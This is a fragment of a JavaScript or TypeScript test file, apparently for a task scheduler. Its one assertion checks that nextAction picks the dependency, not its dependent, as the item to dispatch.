  assert.equal(nextAction(dependency, [dependent, dependency], new Date(at))!.kind, 'dispatch', 'the dependency is the one that gets dispatched');
});

